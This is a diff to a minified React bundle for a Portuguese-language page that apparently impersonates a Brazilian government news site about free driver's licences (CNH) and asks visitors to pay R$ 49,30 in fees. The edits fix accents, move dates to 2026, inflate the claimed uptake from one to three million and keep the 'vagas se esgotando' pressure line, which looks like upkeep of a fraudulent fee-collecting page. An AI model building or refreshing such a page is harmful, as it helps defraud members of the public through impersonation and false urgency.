@@ -15148,7 +15148,7 @@ function gp() {
             className: "bg-red-50 p-4 rounded-lg border border-red-200 mb-6",
             children: [l.jsx("h4", {
               className: "font-semibold text-red-800 mb-2 text-center",
-              children: "âš ️ Atenção"
+              children: "Atenção"
             }), l.jsxs("p", {
               className: "text-sm text-red-700",
               children: ["Informamos que, caso o pagamento da ", l.jsx("strong", {
@@ -22926,7 +22926,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 49,30, clique no botão 
                     className: "flex justify-between py-1 border-b border-gray-200",
                     children: [l.jsx("span", {
                       className: "text-gray-700",
-                      children: "TAXA DE EXPEDIÇÁƒO DE DOCUMENTO (TED)"
+                      children: "TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)"
                     }), l.jsx("span", {
                       className: "font-semibold",
                       children: "16,25"
@@ -22944,7 +22944,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 49,30, clique no botão 
                     className: "flex justify-between py-1 border-b border-gray-200",
                     children: [l.jsx("span", {
                       className: "text-gray-700",
-                      children: "TAXA DE PROCESSAMENTO ELETRÁ”NICO (TPE)"
+                      children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
                       children: "11,35"
@@ -24343,7 +24343,7 @@ function uT() {
           className: "text-gray-400 text-xs mx-1"
         }), l.jsx("span", {
           className: "text-[#1351B4]",
-          children: "2025"
+          children: "2026"
         }), l.jsx(es, {
           className: "text-gray-400 text-xs mx-1"
         }), l.jsx("span", {
@@ -24357,7 +24357,7 @@ function uT() {
             fontSize: "0.8125rem",
             color: "#333333"
           },
-          children: "Como solicitar sua Carteira de motorista gratuitamente e sem autoescola"
+          children: "Como solicitar sua Carteira de motorista sem autoescola"
         })]
       })
     }), l.jsx("div", {
@@ -24371,7 +24371,7 @@ function uT() {
           style: {
             color: "#555555"
           },
-          children: "TRÁ‚NSITO"
+          children: "TRÂNSITO"
         })
       }), l.jsx("h1", {
         className: "text-2xl md:text-3xl font-bold leading-tight mb-4",
@@ -24384,12 +24384,12 @@ function uT() {
         style: {
           color: "#555555"
         },
-        children: ["Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
+        children: ["Mais de 3 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
           style: {
             color: "#333333"
           },
           children: "as vagas para 2026 estão se esgotando."
-        }), " A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito."]
+        }), " A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online."]
       }), l.jsxs("div", {
         className: "flex items-center gap-4 mb-4",
         children: [l.jsx("span", {
@@ -24444,7 +24444,7 @@ function uT() {
         children: [l.jsx("p", {
           children: "Publicado em 09/12/2025 20h58"
         }), l.jsx("p", {
-          children: "Atualizado em 10/12/2025 14h42"
+          children: "Atualizado em 27/06/2026 00h00"
         })]
       }), l.jsx("div", {
         className: "mb-8",
